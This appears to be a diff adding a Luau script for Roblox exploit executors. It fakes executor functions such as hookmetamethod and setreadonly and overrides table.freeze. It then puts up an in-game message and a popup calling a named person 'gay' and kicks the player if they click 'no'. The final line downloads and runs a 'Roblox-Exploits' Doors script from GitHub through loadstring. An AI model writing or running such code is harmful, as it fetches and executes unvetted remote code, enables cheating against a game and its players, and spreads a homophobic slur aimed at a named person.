@@ -1,0 +1,125 @@
+local saved_data = {
+    Saved_Metatable = {},
+    ReadOnly = {},
+    OriginalTables = {},
+    Luau_setmetatable = setmetatable
+}
+
+function isreadonly(tbl)
+    if saved_data.ReadOnly[tbl] ~= nil then
+		return saved_data.ReadOnly[tbl]
+	end
+    return table.isfrozen(tbl) or false
+end
+
+function setreadonly(tbl, readOnly)
+    if readOnly then
+        saved_data.ReadOnly[tbl] = true
+        local clone = table.clone(tbl)
+        saved_data.OriginalTables[clone] = tbl
+        return saved_data.Luau_setmetatable(clone, {
+            __index = tbl,
+            __newindex = function(_, key, value)
+                warn("attempt to modify a readonly table")
+            end
+        })
+    else
+        return tbl
+    end
+end
+
+table.freeze = function(tbl)
+        saved_data.ReadOnly[tbl] = true
+        local clone = table.clone(tbl)
+        saved_data.OriginalTables[clone] = tbl
+        return saved_data.Luau_setmetatable(clone, {
+            __index = tbl,
+            __newindex = function(_, key, value)
+                warn("attempt to modify a readonly table")
+            end
+        })
+end
+
+table.isfrozen = function(tbl)
+    if saved_data.ReadOnly[tbl] ~= nil then
+        return saved_data.ReadOnly[tbl]
+	end
+	return false
+end
+
+-- Credits to Rebel
+
+function hookmetamethod(obj, method, rep)
+    local mt = getrawmetatable(obj)
+	if mt == nil then
+		mt = debug.getmetatable(obj)
+	end
+	if mt[method] == nil then
+		mt[method] = function() end
+	end
+	local old = mt[method]
+    
+    setreadonly(mt, false)
+    mt[method] = rep
+    setreadonly(mt, true)
+    
+    return old
+end
+
+function getnamecallmethod()
+    local info = debug.getinfo(3, "nS")
+    if info then
+        if info.what == "C" then
+			if info.name ~= nil then
+				return info.name
+			end
+            return "unknown"
+        end
+    end
+    return "unknown"
+end
+
+function debug.getprotos(f)
+    local protos = {}
+    
+    spawn(function()
+        local i = 1
+
+        while true do
+            local info = debug.getinfo(f, "f", i)
+            if not info then break end
+            table.insert(protos, info.func)
+            i = i + 1
+			task.wait()
+			task.wait()
+        end
+    end)
+
+    task.wait()
+
+    return protos
+end
+
+msg = Instance.new("Message")
+msg.Parent = game.Workspace
+msg.Text = "Thenokind is GАY"
+
+if messagebox then
+    local title = "ALERT"
+    local message = "THENOKIND IS GAY"
+    local buttonType = 3 
+    local iconType = 1 
+
+    local result = messagebox(message, title, buttonType, iconType)
+    
+    if result == "yes" then
+        messagebox("YEAH", "YAY", 1, 1)
+    elseif result == "no" then
+        game:GetService("Players").LocalPlayer:Kick("LIER")
+    end
+else
+    print("idk.")
+end
+
+      
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/b753dc1195e891657ceccb66220263e969a9a63c/scripts/Doors.lua"))()
